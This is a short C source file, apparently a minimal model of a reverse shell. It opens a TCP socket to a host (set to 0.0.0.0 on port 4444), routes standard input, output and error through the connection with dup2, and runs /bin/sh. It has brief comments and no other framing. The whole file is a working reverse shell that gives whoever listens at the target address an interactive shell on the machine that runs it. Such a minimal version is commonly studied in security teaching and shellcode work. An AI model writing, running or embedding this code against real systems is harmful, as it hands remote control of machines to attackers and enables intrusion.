/* reverse_shell_model.c
 *  - Connect to a host, provide shell.
 */

#include <sys/socket.h>	// socket, AF_INET, SOCK_STREAM
#include <unistd.h>	// dup2
#include <netinet/in.h>	// sockaddr, htons, INADDR_ANY
#include <arpa/inet.h>	// inet_addr

int main() {
	int port = 4444;
	const char *host = "0.0.0.0";
	int sockfd;
	struct sockaddr_in sockaddr;

	// Build socket

	sockfd = socket(AF_INET, SOCK_STREAM, 0);

	// Connect socket to host

	sockaddr.sin_family = AF_INET;
	sockaddr.sin_port = htons(port);
	sockaddr.sin_addr.s_addr = inet_addr(host);
	connect(sockfd, (struct sockaddr *) &sockaddr, sizeof(sockaddr));

	// Route i/o through connection

	dup2(sockfd, 0);
	dup2(sockfd, 1);
	dup2(sockfd, 2);

	// Execute /bin/sh

	execve("/bin/sh", 0, 0);

	return 0;
}
